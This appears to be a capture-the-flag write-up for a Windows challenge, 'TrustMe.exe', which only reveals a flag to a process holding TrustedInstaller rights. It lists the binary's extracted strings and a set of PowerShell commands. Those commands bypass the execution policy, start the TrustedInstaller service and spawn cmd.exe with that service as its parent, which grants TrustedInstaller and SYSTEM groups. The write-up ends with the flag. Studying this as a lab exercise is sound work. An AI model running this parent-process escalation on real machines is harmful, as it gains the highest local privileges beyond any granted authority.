## Chall description
```
Category: Misc
C'mon bro, trust me! Just trust me!! Trust me bro!!!

The TrustMe.exe program on this Windows desktop "doesn't trust me?"

It says it will give me the flag, but only if I "have the permissions of Trusted Installer"...?
```

## Procedure
After extract the strings from `TrustMe.exe`, I could see a refence to `c:\ctf\key.bin` file, and using AES256 Encryption with a base64 strings `Wx6eETGXddnmCT4qZ7BxgRYpC+kdjjFzXxW+BM4HiI3GPaslpFBnpk9XplnaSxNg`. 
Doing a dynamic analysis and checking the code with IDA, the binary check if I have `TrustedInstaller` permission to allow access to flag, and use `S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464` as reference.
```
;csm
Wx6eETGXddnmCT4qZ7BxgRYpC+kdjjFzXxW+BM4HiI3GPaslpFBnpk9XplnaSxNg
[C:\\ctf\\key.bin
S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464
TI_FLAG_WIN
Flag Viewer
EDIT
Close
BUTTON
Error
Internal error: SID conversion failed.
Internal error: token check failed.
Access denied
I don't trust ya! I'll give you the flag... but only if you have Trusted Installer permissions!
Key error
Could not open key.bin. Are permissions set for TrustedInstaller only?
key.bin must be exactly 32 bytes (AES-256 key).
Cipher length %u is not a multiple of 16.
Base64 likely corrupted.
Bad ciphertext
Decrypt error
Ciphertext decode failed. (Check CIPH_B64)
Decryption failed. (Key/IV/cipher mismatch)
```
Reading about how to get `TrustedInstaller` permission (Yes, I found a John Hammond video talking about that), You will need to start the `TrustedInstaller` service, and do a proccess Injection.

After start the service, get the `TrustedInstaller` PID.
```powershell
Install-Module -Name NtObjectManager -RequiredVersion 1.1.32
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Import-Module NtObjectManager
sc.exe start TrustedInstaller
$p = Get-NtProcess TrustedInstaller.exe
PS C:\Windows\System32> $p

## Output
Handle Name                 NtTypeName Inherit ProtectFromClose
------ ----                 ---------- ------- ----------------
5852   TrustedInstaller.exe Process    False   False
```

Then, Inject new process using `TrustedInstaller` Process as Parent, This will allow us to get the right permissions  `NT SERVICE\TrustedInstaller  Well-known group S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464`
```powershell
$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p

## New CMD Console
C:\Windows\System32>whoami
nt authority\system
C:\Windows\System32>whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                            Attributes
====================================== ================ ============================================================== ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384
Everyone                               Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                       Mandatory group, Enabled by default, Enabled group
NT SERVICE\TrustedInstaller            Well-known group S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464 Enabled by default, Enabled group, Group owner
LOCAL                                  Well-known group S-1-2-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                 Alias            S-1-5-32-544                                                   Enabled by default, Enabled group, Group owner
```

Just navegate to Administrator Desktop and execute `TrustMe.exe` file to recover the flag.

<img width="1337" height="262" alt="Screenshot 2025-10-07 at 10 47 00 AM" src="https://github.com/user-attachments/assets/46327429-987e-46db-afe7-fc42fbaf0110" />

Flag `flag{c6065b1f12395d526595e62cf1f4d82a}`

